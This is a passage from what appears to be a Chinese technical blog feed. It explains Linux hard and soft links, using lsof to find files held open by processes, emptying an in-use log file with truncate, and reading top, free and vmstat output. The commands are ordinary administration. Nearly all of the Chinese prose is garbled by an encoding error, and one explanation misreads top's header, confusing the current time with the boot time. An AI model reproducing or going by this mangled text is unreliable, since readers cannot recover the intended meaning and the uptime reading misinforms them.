<p>ç¡¬é“¾æ¥å°±æ˜¯åœ¨Directoryä¸­åŠ å…¥ä¸€æ¡filenameå’ŒInodeçš„å¯¹åº”å…³ç³»ï¼Œæ‰€ä»¥å¦‚æœä½ åˆ é™¤äº†åŸæ¥çš„æ–‡ä»¶ï¼Œæ˜¯ä¸å¯¹ç¡¬é“¾æ¥æ–‡ä»¶æœ‰ä»»ä½•å½±å“çš„ï¼Œå› ä¸ºåˆ é™¤æ–‡ä»¶å°±æ˜¯å°†link count å‡å°‘ï¼Œå½“å‘ç°æŒ‡å‘Inodeä¸ºfilenameæ•°é‡0çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå›æ”¶ç›¸åº”çš„Inodeå’ŒBlockç©ºé—´ã€‚ä½†æ˜¯è½¯é“¾æ¥å°±ä¸åŒäº†ï¼Œåœ¨Linuxä¸‹æ‰€æœ‰çš„éƒ½æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥è½¯é“¾æ¥ä¹Ÿæœ‰è‡ªå·±çš„Inodeå’Œblock ï¼Œä½†æ˜¯åˆ›å»ºè½¯é“¾æ¥ä¸ä¼šåœ¨å¢åŠ åŸæ–‡ä»¶Inode-Indexï¼Œå½“åˆ é™¤åŸæ–‡ä»¶çš„æ—¶å€™ï¼Œç›¸åº”çš„Indexä¸å†èƒ½æ‰¾åˆ°ï¼Œæ‰€ä»¥å¯¼è‡´è½¯é“¾æ¥ä¸èƒ½ç”¨ã€‚ä½†æ˜¯è½¯é“¾æ¥æœ‰è‡ªèº«çš„ä¼˜åŠ¿ï¼Œå¯ä»¥è·¨åˆ†åŒºï¼Œè¿™æ ·å°±å¯ä»¥è§£å†³å½“å‰Inodeæ•°æ®åŒºä¸è¶³å¤Ÿå†™å…¥ï¼Œå¯ä»¥ä½¿ç”¨è½¯é“¾æ¥æŒ‡å‘ç©ºé—´å……è¶³çš„ç©ºé—´ã€‚</p>
</blockquote>
<h3 id="åŒºåˆ«"><a href="#åŒºåˆ«" class="headerlink" title="åŒºåˆ«"></a>åŒºåˆ«</h3><p>è½¯é“¾æ¥  ç¡¬é“¾æ¥ åŒºåˆ«</p>
<img src="/2017/09/10/how-to-delete-file-correctly/links.png" title="è½¯é“¾æ¥å’Œç¡¬é“¾æ¥çš„åŒºåˆ«">
<h2 id="æ–‡ä»¶æ˜¯å¦è¢«å ç”¨"><a href="#æ–‡ä»¶æ˜¯å¦è¢«å ç”¨" class="headerlink" title="æ–‡ä»¶æ˜¯å¦è¢«å ç”¨"></a>æ–‡ä»¶æ˜¯å¦è¢«å ç”¨</h2><p>ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ‰€ä»¥lsofï¼ˆlist open fileï¼‰å°±å¾ˆé‡è¦</p>
<p>lsof -i ï¼š8080 æŸ¥çœ‹ç«¯å£å ç”¨</p>
<p>socket ä¹Ÿæ˜¯æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof  catalina.out</span><br><span class="line"></span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF     NODE NAME</span><br><span class="line">java    40916 tomcat    1w   REG    8,7   933679 27656540 catalina.out</span><br><span class="line">java    40916 tomcat    2w   REG    8,7   933679 27656540 catalina.out</span><br></pre></td></tr></table></figure>
<blockquote>
<p>â€˜â€˜REGâ€™â€™ for a regular file<br>FD         is the File Descriptor number of the file or:</p>
</blockquote>
<pre><code>     cwd  current working directory;
     Lnn  library references (AIX);
     err  FD information error (see NAME column);
     jld  jail directory (FreeBSD);
     ltx  shared library text (code and data);
     Mxx  hex memory-mapped type number xx.
     m86  DOS Merge mapped file;
     mem  memory-mapped file;
     mmap memory-mapped device;
     pd   parent directory;
     rtd  root directory;
     tr   kernel trace file (OpenBSD);
     txt  program text (code and data);
     v86  VP/ix mapped file;

FD is followed by one of these characters, describing the mode under which the file is open:

     r for read access;
     w for write access;
     u for read and write access;
     space if mode unknown and no lock
          character follows;
     â€˜-â€™ if mode unknown and lock
          character follows.
</code></pre><p>å¯ä»¥çœ‹å‡ºä¸Šé¢çš„æ–‡ä»¶çš„fdæ˜¯1, wæƒé™</p>
<p>ç³»ç»Ÿï¼Œæ¯ä¸ªè¿›ç¨‹ï¼Œæ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ls /proc/40916/fd</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„ä¸¤ä¸ªå‘½ä»¤æ˜¯ç­‰ä»·çš„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /proc/40916/fd/2</span><br><span class="line"></span><br><span class="line">sudo cat catalina.out</span><br></pre></td></tr></table></figure>
<h2 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h2><p>åˆ é™¤æ–‡ä»¶ä¹‹å‰åº”è¯¥å…ˆçœ‹ä¸‹æ–‡ä»¶çš„å ç”¨æƒ…å†µï¼Œ<code>lsof</code>å¯ä»¥æŸ¥çœ‹åˆ°æ–‡ä»¶è¢«å“ªä¸ªè¿›ç¨‹å ç”¨ã€‚</p>
<p>å¦‚æœè¢«å ç”¨ï¼Œç›´æ¥ä½¿ç”¨<code>rm</code>åˆ é™¤ç›¸å½“äºåªæ˜¯åˆ é™¤äº†æ–‡ä»¶åå’Œinodeçš„å…³è”, ä½†æ˜¯æ–‡ä»¶å ç”¨çš„ç©ºé—´è¿˜åœ¨(block), åº”è¯¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œåˆ é™¤ï¼š</p>
<blockquote>
<p>You misunderstand: deletion will be complete only after all processes using the file at the time of deletion have reached completion: only then the deleted inode will be returned to the pool of available inodes, and the content of the file may begin to be corrupted by over-writing. Until then, the inode is alive and well, and is pointing to the area of the disk containing the file in question. As soon as less completes, the soft link will disappear, and so will the file testing.txt.</p>
</blockquote>
<blockquote>
<pre><code>å½“æˆ‘ä»¬ä½¿ç”¨rmå‘½ä»¤çš„æ—¶å€™ï¼Œç³»ç»Ÿå¹¶ä¸ä¼šçœŸæ­£åˆ é™¤è¿™ä¸ªèµ„æ–™ã€‚é™¤éæœ‰æ¡£æ¡ˆéè¦å°†èµ„æ–™å­˜å‚¨åœ¨åŸæ¥æ¡£æ¡ˆçš„è¿™äº›blockä¸­ã€‚è¿™æ ·åŸæ¥çš„blockå°±ä¼šè¢«æ–°æ¡£æ¡ˆç»™è¦†ç›–æ‰ã€‚ 
</code></pre></blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /dev/null &gt; filename</span><br><span class="line">æˆ–è€…</span><br><span class="line">truncate -s 0 filename</span><br></pre></td></tr></table></figure>
<h3 id="stat-å‘½ä»¤"><a href="#stat-å‘½ä»¤" class="headerlink" title="stat å‘½ä»¤"></a>stat å‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">stat</span> /proc/40916/fd/2</span><br><span class="line"></span><br><span class="line">File: `/proc/40916/fd/2<span class="string">' -&gt; `/home/q/www/qta.open.coupon.provider/logs/catalina.out'</span></span><br><span class="line">  Size: 64        	Blocks: 0          IO Block: 1024   symbolic link</span><br><span class="line">Device: 3h/3d	Inode: 3017464897  Links: 1</span><br><span class="line">Access: (0300/l-wx------)  Uid: (40001/  tomcat)   Gid: (40001/  tomcat)</span><br><span class="line">Access: 2017-07-05 05:05:06.318550652 +0800</span><br><span class="line">Modify: 2017-06-15 12:35:24.590599522 +0800</span><br><span class="line">Change: 2017-06-15 12:35:24.590599522 +0800</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">stat</span> catalina.out</span><br><span class="line"></span><br><span class="line">File: `catalina.out<span class="string">'</span></span><br><span class="line"><span class="string">  Size: 962851    	Blocks: 1896       IO Block: 4096   regular file</span></span><br><span class="line"><span class="string">Device: 807h/2055d	Inode: 27656540    Links: 1</span></span><br><span class="line"><span class="string">Access: (0644/-rw-r--r--)  Uid: (40001/  tomcat)   Gid: (40001/  tomcat)</span></span><br><span class="line"><span class="string">Access: 2017-07-06 00:51:44.243427414 +0800</span></span><br><span class="line"><span class="string">Modify: 2017-07-06 00:52:27.096557541 +0800</span></span><br><span class="line"><span class="string">Change: 2017-07-06 00:52:27.096557541 +0800</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sudo ls -i /proc/40916/fd/2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3017464897 /proc/40916/fd/2</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡º, æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªè½¯é“¾æ¥.</p>
<h3 id="ç›®å½•ä¸‹çš„æ–‡ä»¶å ç”¨ç©ºé—´å¾ˆå°-ä½†æ˜¯ç›®å½•å ç”¨ç©ºé—´å¾ˆå¤§"><a href="#ç›®å½•ä¸‹çš„æ–‡ä»¶å ç”¨ç©ºé—´å¾ˆå°-ä½†æ˜¯ç›®å½•å ç”¨ç©ºé—´å¾ˆå¤§" class="headerlink" title="ç›®å½•ä¸‹çš„æ–‡ä»¶å ç”¨ç©ºé—´å¾ˆå°, ä½†æ˜¯ç›®å½•å ç”¨ç©ºé—´å¾ˆå¤§"></a>ç›®å½•ä¸‹çš„æ–‡ä»¶å ç”¨ç©ºé—´å¾ˆå°, ä½†æ˜¯ç›®å½•å ç”¨ç©ºé—´å¾ˆå¤§</h3><p>è¿™ç§æƒ…å†µ, æœ€å¸¸è§çš„å°±æ˜¯æ–‡ä»¶è¢«åˆ é™¤äº†, ä½†æ˜¯è¿˜æœ‰è¿›ç¨‹å ç”¨å®ƒ. äºæ˜¯è¿™ä¸ªæ–‡ä»¶å ç”¨çš„blockå°±æ²¡æœ‰é‡Šæ”¾æ‰.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof | grep deleted</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤å°±å¯ä»¥çœ‹åˆ°,é‚£äº›æ–‡ä»¶è¢«åˆ é™¤äº†, ä½†æ˜¯è¿˜åœ¨è¢«å ç”¨.  killæ‰ç›¸åº”çš„è¿›ç¨‹, ç©ºé—´å°±è‡ªå·±å›æ¥äº†.</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/lsof.html" rel="external nofollow noopener noreferrer" target="_blank">3. lsof ä¸€åˆ‡çš†æ–‡ä»¶ â€” Linux Tools Quick Tutorial</a></p>
</li>
<li><p><a href="https://unix.stackexchange.com/questions/92384/how-to-clean-log-file" rel="external nofollow noopener noreferrer" target="_blank">How to clean log file? - Unix &amp; Linux Stack Exchange</a></p>
</li>
<li><p><a href="https://unix.stackexchange.com/questions/88808/empty-the-contents-of-a-file" rel="external nofollow noopener noreferrer" target="_blank">shell script - Empty the contents of a file - Unix &amp; Linux Stack Exchange</a></p>
</li>
<li><p><a href="http://himichaelchu.iteye.com/blog/2116023" rel="external nofollow noopener noreferrer" target="_blank">é€šè¿‡InodeåŸç†åˆ†æLinuxä¸­lnå‘½ä»¤ - Michael Chu - ITeyeæŠ€æœ¯ç½‘ç«™</a></p>
</li>
<li><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html" rel="external nofollow noopener noreferrer" target="_blank">ç†è§£ Linux çš„ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥</a></p>
</li>
<li><p><a href="https://superuser.com/questions/1112781/why-do-symbolic-links-in-prox-pid-fd-act-as-hard-links" rel="external nofollow noopener noreferrer" target="_blank">linux - why do symbolic links in /prox/$PID/fd/ act as hard links? - Super User</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> lsof </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[topç”¨æ³•]]></title>
      <url>http://qsli.github.io/2017/09/09/top/</url>
      <content type="html"><![CDATA[<h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h2><p>topæ˜¯äº†è§£ç³»ç»ŸçŠ¶å†µæœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œä»topçš„è¾“å‡ºæˆ‘ä»¬å¯ä»¥å¾ˆå¥½çš„æŒæ¡ç³»ç»Ÿçš„CPU, å†…å­˜ï¼Œswapï¼Œè¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ã€‚</p>
<p>ä¸‹é¢è¯´ä¸‹topçš„åŸºæœ¬ç”¨æ³•ï¼š</p>
<p><br><br></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx /home/www/xxx]$ sudo top</span><br><span class="line"></span><br><span class="line">top - 15:19:54 up 200 days,  4:06,  1 user,  load average: 5.91, 6.14, 5.57</span><br><span class="line">Tasks: 499 total,   1 running, 498 sleeping,   0 stopped,   0 zombie</span><br><span class="line">Cpu(s): 20.1%us,  1.2%sy,  0.0%ni, 78.4%id,  0.0%wa,  0.0%hi,  0.4%si,  0.0%st</span><br><span class="line">Mem:  65979844k total, 65004736k used,   975108k free,     8108k buffers</span><br><span class="line">Swap: 50331644k total,    29364k used, 50302280k free,  5530672k cached</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                            </span><br><span class="line"> 8468 tomcat    20   0 71.2g  55g 6484 S 492.3 87.8  32033:12 java                                                                              </span><br><span class="line"> 1256 tomcat    20   0 6055m 251m 2504 S 24.9  0.4  41886:22 java                                                                               </span><br><span class="line"> 2446 root      20   0 15304 1568  928 R  0.7  0.0   0:00.11 top                                                                                </span><br><span class="line">30593 root      20   0  526m  31m 3208 S  0.3  0.0   0:15.41 salt-minion                                                                        </span><br><span class="line">    1 root      20   0 19232  632  384 S  0.0  0.0  11:49.23 init                                                                               </span><br><span class="line">    2 root      20   0     0    0    0 S  0.0  0.0   0:00.32 kthreadd                                                                           </span><br><span class="line">    3 root      RT   0     0    0    0 S  0.0  0.0   2:55.22 migration/0                                                                        </span><br><span class="line">    4 root      20   0     0    0    0 S  0.0  0.0   5:49.74 ksoftirqd/0                                                                        </span><br><span class="line">    5 root      RT   0     0    0    0 S  0.0  0.0   0:00.00 stopper/0</span><br></pre></td></tr></table></figure>
<h3 id="ç³»ç»Ÿæ¦‚å†µ"><a href="#ç³»ç»Ÿæ¦‚å†µ" class="headerlink" title="ç³»ç»Ÿæ¦‚å†µ"></a>ç³»ç»Ÿæ¦‚å†µ</h3><p> ä»è¾“å‡ºçš„ç¬¬ä¸€è¡Œæ¥çœ‹ï¼Œ é¦–å…ˆæ˜¯ç³»ç»Ÿçš„uptimeä¿¡æ¯(ä½¿ç”¨<code>uptime</code>ä¹Ÿå¯ä»¥æŸ¥çœ‹)ï¼Œ å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå·²ç»è¿è¡Œäº†200å¤©äº†ï¼Œæ˜¯åœ¨<code>15ï¼š19ï¼š54</code>è¿™ä¸ªæ—¶é—´ç‚¹å¯åŠ¨èµ·æ¥çš„ï¼Œ <code>4ï¼š06</code> æ˜¯å½“å‰çš„æ—¶é—´ï¼Œ å½“å‰åªæœ‰ä¸€ä¸ªç”¨æˆ·ç™»å½•(ä½¿ç”¨<code>w</code>ä¹Ÿå¯ä»¥æŸ¥çœ‹å½“å‰çš„ç™»å½•ç”¨æˆ·)ã€‚ è¿˜æœ‰å°±æ˜¯ç³»ç»Ÿçš„è´Ÿè½½â€”â€”load averageï¼Œè¿™ä¸ªæœ‰ä¸‰ä¸ªå€¼ï¼Œåˆ†åˆ«æ˜¯1åˆ†é’Ÿçš„å¹³å‡è´Ÿè½½ï¼Œ 5åˆ†é’Ÿçš„ï¼Œ 15åˆ†é’Ÿçš„ï¼ˆ<code>uptime</code>çš„è¾“å‡ºä¿¡æ¯ä¸­ä¹Ÿæœ‰è¿™ä¸ªï¼‰ã€‚</p>
<p> ç¬¬äºŒè¡ŒåŒ…å«äº†ç³»ç»Ÿè¿›ç¨‹çš„ä¸€äº›ç»Ÿè®¡ä¿¡æ¯ï¼ŒTasksæ˜¯è¿è¡Œé˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ä¸ªæ•°ï¼ˆLinux run-queueï¼‰ï¼Œ è¿˜æœ‰ä¸€äº›å…¶ä»–çŠ¶æ€çš„è¿›ç¨‹çš„ä¸ªæ•°ä¿¡æ¯</p>
<blockquote>
<ul>
<li><strong>running</strong>:  CPU ä¸Šè¿è¡Œçš„å’Œå°†è¦è¢«è°ƒåº¦è¿è¡Œçš„ï¼›</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>sleeping</strong>: é€šå¸¸æ˜¯ç­‰å¾…äº‹ä»¶(æ¯”å¦‚ IO æ“ä½œ)å®Œæˆçš„ä»»åŠ¡ï¼Œç»†åˆ†å¯ä»¥åŒ…æ‹¬ interruptible å’Œ uninterruptible çš„ç±»å‹ï¼›</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>stopped</strong>: æ˜¯ä¸€äº›è¢«æš‚åœçš„ä»»åŠ¡ï¼Œé€šå¸¸å‘é€ SIGSTOP æˆ–è€…å¯¹ä¸€ä¸ªå‰å°ä»»åŠ¡æ“ä½œ Ctrl-Z å¯ä»¥å°†å…¶æš‚åœï¼›</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>zombie</strong>: åƒµå°¸ä»»åŠ¡ï¼Œè™½ç„¶è¿›ç¨‹ç»ˆæ­¢èµ„æºä¼šè¢«è‡ªåŠ¨å›æ”¶ï¼Œä½†æ˜¯å«æœ‰é€€å‡ºä»»åŠ¡çš„ task descriptor éœ€è¦çˆ¶è¿›ç¨‹è®¿é—®åæ‰èƒ½é‡Šæ”¾ï¼Œè¿™ç§è¿›ç¨‹æ˜¾ç¤ºä¸º <code>defunct</code> çŠ¶æ€ï¼Œæ— è®ºæ˜¯å› ä¸ºçˆ¶è¿›ç¨‹æå‰é€€å‡ºè¿˜æ˜¯æœª wait è°ƒç”¨ï¼Œå‡ºç°è¿™ç§è¿›ç¨‹éƒ½åº”è¯¥æ ¼å¤–æ³¨æ„ç¨‹åºæ˜¯å¦è®¾è®¡æœ‰è¯¯ã€‚</li>
</ul>
</blockquote>
<h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p> ç¬¬ä¸‰è¡Œæ˜¯CPUçš„ä¸€äº›ä¿¡æ¯ï¼Œå„ä¸ªéƒ¨åˆ†çš„å ç”¨éƒ½å¾ˆæ˜ç¡®ã€‚</p>
<blockquote>
<ul>
<li>(us) userï¼šCPU åœ¨ä½ nice å€¼(é«˜ä¼˜å…ˆçº§)ç”¨æˆ·æ€æ‰€å ç”¨çš„æ—¶é—´(nice&lt;=0)ã€‚æ­£å¸¸æƒ…å†µä¸‹åªè¦æœåŠ¡å™¨ä¸æ˜¯å¾ˆé—²ï¼Œé‚£ä¹ˆå¤§éƒ¨åˆ†çš„ CPU æ—¶é—´åº”è¯¥éƒ½åœ¨æ­¤æ‰§è¡Œè¿™ç±»ç¨‹åº</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(sy) systemï¼šCPU å¤„äºå†…æ ¸æ€æ‰€å ç”¨çš„æ—¶é—´ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡ç³»ç»Ÿè°ƒç”¨(system call)ä»ç”¨æˆ·æ€é™·å…¥å†…æ ¸æ€ï¼Œä»¥æ‰§è¡Œç‰¹å®šçš„æœåŠ¡ï¼›é€šå¸¸æƒ…å†µä¸‹è¯¥å€¼ä¼šæ¯”è¾ƒå°ï¼Œä½†æ˜¯å½“æœåŠ¡å™¨æ‰§è¡Œçš„ IO æ¯”è¾ƒå¯†é›†çš„æ—¶å€™ï¼Œè¯¥å€¼ä¼šæ¯”è¾ƒå¤§</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(ni) niceï¼šCPU åœ¨é«˜ nice å€¼(ä½ä¼˜å…ˆçº§)ç”¨æˆ·æ€ä»¥ä½ä¼˜å…ˆçº§è¿è¡Œå ç”¨çš„æ—¶é—´(nice&gt;0)ã€‚é»˜è®¤æ–°å¯åŠ¨çš„è¿›ç¨‹ nice=0ï¼Œæ˜¯ä¸ä¼šè®¡å…¥è¿™é‡Œçš„ï¼Œé™¤éæ‰‹åŠ¨é€šè¿‡ renice æˆ–è€… setpriority() çš„æ–¹å¼ä¿®æ”¹ç¨‹åºçš„niceå€¼</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(id) idleï¼šCPU åœ¨ç©ºé—²çŠ¶æ€(æ‰§è¡Œ kernel idle handler )æ‰€å ç”¨çš„æ—¶é—´</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(wa) iowaitï¼šç­‰å¾… IO å®Œæˆåšå ç”¨çš„æ—¶é—´</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(hi) irqï¼šç³»ç»Ÿå¤„ç†ç¡¬ä»¶ä¸­æ–­æ‰€æ¶ˆè€—çš„æ—¶é—´</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(si) softirqï¼šç³»ç»Ÿå¤„ç†è½¯ä¸­æ–­æ‰€æ¶ˆè€—çš„æ—¶é—´ï¼Œè®°ä½è½¯ä¸­æ–­åˆ†ä¸º softirqsã€tasklets (å…¶å®æ˜¯å‰è€…çš„ç‰¹ä¾‹)ã€work queuesï¼Œä¸çŸ¥é“è¿™é‡Œæ˜¯ç»Ÿè®¡çš„æ˜¯å“ªäº›çš„æ—¶é—´ï¼Œæ¯•ç«Ÿ work queues çš„æ‰§è¡Œå·²ç»ä¸æ˜¯ä¸­æ–­ä¸Šä¸‹æ–‡äº†</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(st) stealï¼šåœ¨è™šæ‹Ÿæœºæƒ…å†µä¸‹æ‰æœ‰æ„ä¹‰ï¼Œå› ä¸ºè™šæ‹Ÿæœºä¸‹ CPU ä¹Ÿæ˜¯å…±äº«ç‰©ç† CPU çš„ï¼Œæ‰€ä»¥è¿™æ®µæ—¶é—´è¡¨æ˜è™šæ‹Ÿæœºç­‰å¾… hypervisor è°ƒåº¦ CPU çš„æ—¶é—´ï¼Œä¹Ÿæ„å‘³ç€è¿™æ®µæ—¶é—´ hypervisor å°† CPU è°ƒåº¦ç»™åˆ«çš„ CPU æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶æ®µçš„ CPU èµ„æºè¢«â€œstolenâ€äº†ã€‚è¿™ä¸ªå€¼åœ¨æˆ‘ KVM çš„ VPS æœºå™¨ä¸Šæ˜¯ä¸ä¸º 0 çš„ï¼Œä½†ä¹Ÿåªæœ‰ 0.1 è¿™ä¸ªæ•°é‡çº§ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥ç”¨æ¥åˆ¤æ–­ VPS è¶…å”®çš„æƒ…å†µï¼Ÿ</li>
</ul>
</blockquote>
<p>iowaitæ‰€åŒ…å«çš„ä¿¡æ¯å…¶å®æ˜¯éå¸¸å°‘çš„ï¼Œå…·ä½“çš„è§£é‡Šå¯ä»¥çœ‹<strong>å‚è€ƒ3</strong>ä¸­çš„æ–‡ç« ï¼Œè®²çš„éå¸¸å¥½.</p>
<blockquote>
<p>%iowait è¡¨ç¤ºåœ¨ä¸€ä¸ªé‡‡æ ·å‘¨æœŸå†…æœ‰ç™¾åˆ†ä¹‹å‡ çš„æ—¶é—´å±äºä»¥ä¸‹æƒ…å†µï¼šCPUç©ºé—²ã€å¹¶ä¸”æœ‰ä»æœªå®Œæˆçš„I/Oè¯·æ±‚</p>
</blockquote>
<h3 id="å†…å­˜"><a href="#å†…å­˜" class="headerlink" title="å†…å­˜"></a>å†…å­˜</h3><p>ç¬¬å››è¡Œä¸»è¦æ˜¯å†…å­˜ä½¿ç”¨çš„ç›¸å…³ä¿¡æ¯ï¼Œ ç³»ç»Ÿçš„å†…å­˜æ€»å…±æœ‰<code>65979844k</code>ï¼Œ å·²ç»ä½¿ç”¨<code>65004736k</code>, <code>975108k</code>å¯ç”¨ï¼Œ <code>8108k</code>ç¼“å­˜, </p>
<p>65979844k = 65004736k + 975108k</p>
<p>å¯è§ç¼“å­˜çš„ä¹ŸåŒ…å«åœ¨å¯ç”¨çš„å†…å­˜ä¸­ã€‚</p>
<p>è¿™äº›ä¿¡æ¯ä¹Ÿå¯ä»¥é€šè¿‡<code>free -k</code> ï¼ˆè¿˜å¯ä»¥-m, -g è¡¨ç¤ºå±•ç¤ºçš„å•ä½ï¼‰ï¼Œ<code>free</code>çš„è¾“å‡ºå¦‚ä¸‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx /home/www/xxx]$ free -k</span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:      65979844   64863960    1115884        112       8824    5331160</span><br><span class="line">-/+ buffers/cache:   59523976    6455868 </span><br><span class="line">Swap:     50331644      29364   50302280</span><br></pre></td></tr></table></figure>
<p><code>vmstat</code> ä¹Ÿå¯ä»¥çœ‹åˆ°ç³»ç»Ÿçš„å†…å­˜çŠ¶å†µï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx /home/www/xxx]$ vmstat 1 3 | column -t</span><br><span class="line">procs  -----------memory----------  ---swap--  -----io----  --system--  -----cpu-----</span><br><span class="line">r      b                            swpd       free         buff        cache          si  so  bi   bo   <span class="keyword">in</span>     cs     us  sy  id  wa  st</span><br><span class="line">5      1                            29364      2231704      8808        4214104        0   0   124  230  0      0      15  1   84  0   0</span><br><span class="line">6      0                            29364      2219016      8908        4225260        0   0   668  132  47040  68271  25  2   72  0   0</span><br><span class="line">5      0                            29364      2209552      8916        4234020        0   0   512  12   37178  52578  20  2   78  0   0</span><br></pre></td></tr></table></figure>
<p>ç¬¬äº”è¡Œå’Œç¬¬å››è¡Œç±»ä¼¼ï¼Œè¾“å‡ºçš„æ˜¯swapçš„ä½¿ç”¨æƒ…å†µã€‚</p>
<h3 id="è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯"><a href="#è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯"></a>è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯</h3><blockquote>
